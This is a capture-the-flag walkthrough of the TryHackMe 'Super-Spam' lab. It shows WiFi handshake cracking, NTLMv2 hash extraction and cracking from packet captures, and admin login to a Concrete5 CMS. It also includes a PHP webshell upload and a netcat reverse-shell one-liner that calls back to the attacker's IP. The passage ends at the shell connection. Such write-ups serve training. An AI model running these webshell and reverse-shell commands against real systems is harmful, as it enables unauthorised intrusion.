# Super-Spam

## Introduction

Welcome to my another writeup! In this TryHackMe [Super-Spam](https://tryhackme.com/room/superspamr) room, you'll learn: Inspect packets in WireShark, exploiting file upload vulnerability and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to donalddump](#privilege-escalation)**
4. **[Privilege Escalation: donalddump to root](#donalddump-to-root)**
5. **[Conclusion](#conclusion)**

## Background

> Defeat the evil Super-Spam, and save the day!!
>  
> Difficulty: Medium

---

**General Uvilix:**  

Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! **Beware**, super-spam's evil powers are to confuse and deter his victims.

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# export RHOSTS=10.10.177.91 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29
4012/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 866004c0a5364667f5c7240fdfd00314 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjPfdefRhbpiW/oi5uUVtVRW/pYZcnADODOU4e80iSnuqWfRB5DAXTpzKZNw5JBQGy+4Amwz0DyX/TlYBgXRxPXwFimpBXnc02jpMknSaDzdRnInU8wFcsBQc+GraYz1mMHvRcco2FfIrKurDbyEsBCzwJuk/RKdSq2rcFLhq8QAPoxc9FQcNeUIZrBt53/7+fD7B7NvjjU22+hXZhjt6PLC3LDWcaMvpYCxMYGwKoC9xTs+FtzEFrt6yWzKrXV1iNuKdNyt8vu22bcPl2GrQ9ai9I89DEY4wB3dADP6AfNikbi0QWjdNbW2fhblG9PvKRu9s3IbpVueX2qBfInuAF
|   256 ced2f6ab697faa31f54970e58f62b0b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIs/ZpOvCaKtCEwW4YraPciYLZnrRXDR6voHu0PipWaQpcdnsc8Vg1WMpkX0xgjXc9eD3NuZmBtTcIDTJXi7v4U=
|   256 73a0a197c433fbf44a5c77f6ac9576ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHX1bbkvh6bRHE0hWipYWoYyh+Q+uy3E0yCBOoyY888
4019/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.253
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
5901/tcp open  vnc     syn-ack ttl 63 VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     syn-ack ttl 63 (access denied)
Service Info: Host: example.com; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 5 ports are opened:

Open Ports        | Service
------------------|------------------------
80                | Apache httpd 2.4.29
4012              | OpenSSH 7.6p1 Ubuntu
4019              | vsftpd 3.0.3
5901              | Tight VNC
6001              | X11

### FTP on Port 4019

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# ftp $RHOSTS -P 4019
Connected to 10.10.177.91.
220 (vsFTPd 3.0.3)
Name (10.10.177.91:nam): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We can login as `anonymous`!

**Let's enumerate what's inside:**
```
ftp> ls -lah
229 Entering Extended Passive Mode (|||45160|)
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
```

**`note.txt`:**
```
ftp> get note.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# cat note.txt             
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)
```

**`/IDS_logs`:**
```
ftp> cd IDS_logs
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||41002|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp         14132 Feb 20  2021 12-01-21.req.pcapng
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed010.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed013.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01h3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.t
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed6.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed806.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed810.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed816.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed86.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammeda1ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammedabha.s
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 13-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245a.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed24ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed28v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2a5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2bha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2w5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2we8.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wev.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv8.s
-rw-r--r--    1 ftp      ftp         11004 Feb 20  2021 14-01-21.pcapng
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 16-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.a
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed52n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed00050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed100.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10056.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed11.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed130.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed190.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19046.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed1906.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed2.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed200.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed205.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed23.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed280.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed285.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed4.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed410.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed430.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed480.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed490.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed7.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed72.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed75.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed80.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed81.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed82.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed9.s
```

**`/.cap`:**
```
ftp> cd .cap
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||45736|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
```

```
ftp> get .quicknote.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# cat .quicknote.txt  
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!
```

> "I will place this .cap file here as a souvenir to remind me of how I got in..."

**Let's download the packet capture file `SamsNetwork.cap`:**
```
ftp> get SamsNetwork.cap
```

**Then use WireShark to inspect it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# wireshark SamsNetwork.cap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103005157.png)

Looks like we're dealing with WiFi.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103005731.png)

In here, I saw a lot of **deauth packets**, thus this `cap` file captured different handshake packets. **This allows us to crack the WiFi password via `aircrack` suite.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103005936.png)

**Let's use `aircrack-ng` to crack the password:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt
Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:F8:8C:31:9F:17  Motocplus                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

1 potential targets



                               Aircrack-ng 1.7 

      [00:01:32] 794740/14344392 keys tested (8712.51 k/s) 

      Time left: 25 minutes, 55 seconds                          5.54%

                           KEY FOUND! [ {Redacted} ]


      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 70 72 6D 26 15 45 F9 82 D4 AE A9 29 B9 E7 57 42 
                       7A 40 B4 D1 C3 27 EE 6A 8B 88 87 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0 
```

Found it!

**Now, we can use the key to decrypt all the packets within the WiFi traffics:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103010130.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103010152.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103010214.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103010303.png)

**After decrypted, I found a HTTP request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103011442.png)

No clue what is it.

**Next, let's download all packet capture files in `/IDS_logs`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# wget -r ftp://anonymous:@$RHOSTS:4019/IDS_logs
```

```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# ls -lah               
total 188K
drwxr-xr-x 2 root root 4.0K Jan  3 01:18 .
drwxr-xr-x 3 root root 4.0K Jan  3 01:17 ..
-rw-r--r-- 1 root root  14K Feb 20  2021 12-01-21.req.pcapng
-rw-r--r-- 1 root root  73K Feb 20  2021 13-01-21.pcap
-rw-r--r-- 1 root root    0 Feb 20  2021 13-01-21-spammed010.s
-rw-r--r-- 1 root root    0 Feb 20  2021 13-01-21-spammed013.s
[...]
```

**We can delete 0 byte size empty files:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# find . -size 0 -print -delete
[...]

┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# ls -lah
total 188K
drwxr-xr-x 2 root root 4.0K Jan  3 01:20 .
drwxr-xr-x 3 root root 4.0K Jan  3 01:17 ..
-rw-r--r-- 1 root root  14K Feb 20  2021 12-01-21.req.pcapng
-rw-r--r-- 1 root root  73K Feb 20  2021 13-01-21.pcap
-rw-r--r-- 1 root root  11K Feb 20  2021 14-01-21.pcapng
-rw-r--r-- 1 root root  73K Feb 20  2021 16-01-21.pcap
```

**Again, use WireShark to inspect them.**

**`12-01-21.req.pcapng`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# wireshark 12-01-21.req.pcapng
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103012139.png)

As you can see, it's all **SMB** traffic packets.

**When I follow TCP stream, I found this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103012529.png)

Host name `a-jbrown`, username `backdoor`?

**`13-01-21.pcap`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# wireshark 13-01-21.pcap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103012652.png)

**Let's follow HTTP stream:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103012723.png)

`http://id1.cn/rd.s/Btc5n4unOP4UrIfE`?

Let's google that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103013025.png)

**Packet Injection Attacks?**

Hmm... That's not relevant to us.

**`14-01-21.pcapng`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# wireshark 14-01-21.pcapng
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103013226.png)

Again, SMB packets.

However, this is a SMB login packets.

**In this [blog](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/), it tells us how to extact NTLMv2 hash from a `pcap` file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103013732.png)

Let's follow that walkthrough!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103013828.png)

- Domain name: `3B`
- User name: `lgreen`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103014019.png)

- NTProofStr: `73aeb418ae0e8a9ec167c4d0880cfe22`
- NTLMv2 response: `73aeb418ae0e8a9ec167c4d0880cfe22010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000`

- Deleted NTProofStr's NTLMv2 response: `010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103014338.png)

- NTLM Server Challenge: `a2cce5d65c5fc02f`

- Combine all values: `username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response`
- Full NTLMv2 hash: `lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000`

**Let's crack it!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# echo 'lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000' > ntlmv2.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.txt
[...]
{Redacted}         (lgreen)
```

Cracked!

**`16-01-21.pcap`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# wireshark 16-01-21.pcap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103014815.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103014829.png)

Packet Injection Attacks again. Nothing useful.

### HTTP on Port 80

**Adding a new hosts to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# echo "$RHOSTS superspam.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103015053.png)

Hmm... Error?

We can also see that the web application is using **Concrete5 version 8.5.2**.

**Let's search for public exploits via `searchsploit`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/10.10.177.91:4019/IDS_logs]
└─# searchsploit Concrete5
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
Concrete5 8.5.4 - 'name' Stored XSS                                                               | php/webapps/49721.txt
Concrete5 CMS 5.5.2.1 - Information Disclosure / SQL Injection / Cross-Site Scripting             | php/webapps/37103.txt
Concrete5 CMS 5.6.1.2 - Multiple Vulnerabilities                                                  | php/webapps/26077.txt
Concrete5 CMS 5.6.2.1 - 'index.php?cID' SQL Injection                                             | php/webapps/31735.txt
Concrete5 CMS 5.7.3.1 - 'Application::dispatch' Method Local File Inclusion                       | php/webapps/40045.txt
Concrete5 CMS 8.1.0 - 'Host' Header Injection                                                     | php/webapps/41885.txt
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities                                                | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                                           | php/webapps/44194.py
Concrete5 CMS FlashUploader - Arbitrary '.SWF' File Upload                                        | php/webapps/37226.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
```

Hmm... Nothing useful?

**When I refresh the page, it worked:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103015920.png)

**According to Concrete5 [documentation](https://documentation.concretecms.org/user-guide/guided-tour/logging-in-and%20out), the login page is in `/index.php/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103020111.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103020219.png)

Not found?

**Let's view the source page in the home page:**
```html
<link rel="canonical" href="http://superspam.thm/concrete5/index.php">
```

**It's in `/concrete5/`! So the login page should be at `/concrete5/index.php/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103020839.png)

Yep.

**Now, we can try to brute force it via `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt superspam.thm http-post-form "/concrete5/index.php/login/authenticate/concrete:username=^USER^&userpw=^PASS^:Invalid username or password."
[...]
```

But no dice.

## Initial Foothold

**After poking around the website, I found something in the blog page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103022748.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103022756.png)

- Found admin username: `Adam_Admin`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103023052.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103023123.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103023309.png)

- Found username: `Adam_Admin`, `Benjamin_Blogger`, `Donald_Dump`, `Lucy_Loser`

Armed with new information, **we can try to login as an administrator user with the password that we've cracked in the FTP server's `pcap` files**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024704.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024943.png)

Nice, user `Donald_Dump` worked! We're an administrator in this CMS (Content Management System)!

**After googling a little bit, I found this [blog](https://securityaffairs.co/107294/security/concrete5-cms-rce.html), which talks about this version of Concrete5 CMS is vulnerable to RCE (Remote Code Execution) via file upload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103023929.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024015.png)

**HackerOne [report](https://hackerone.com/reports/768322):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024044.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024050.png)

So basically this is a very simple, basic **file upload vulnerability**. The application doesn't allow users to upload PHP file. **However, an admin user can edit the whitelisted file types to whatever they want, like PHP files.**

Let's follow the report's steps:

- Go to "Allow File Types":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103024957.png)

- Add php extension, and click save:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025053.png)

- Upload PHP webshell via "File Manager":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025315.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025327.png)

**PHP one-liner webshell:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025402.png)

- Click "Close":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025440.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103025502.png)

- Go to the uploaded PHP webshell with GET parameter `cmd`: (`/concrete5/application/files/2116/7273/2440/webshell.php`)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# curl http://superspam.thm/concrete5/application/files/2116/7273/2440/webshell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Boom! We have RCE.

- Get a reverse shell: (Payload is generated from [revshells.com](https://www.revshells.com/))

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# nc -lnvp 443     
listening on [any] 443 ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# curl http://superspam.thm/concrete5/application/files/2116/7273/2440/webshell.php --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.0.253 443 >/tmp/f"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# nc -lnvp 443     
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.177.91] 55538
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
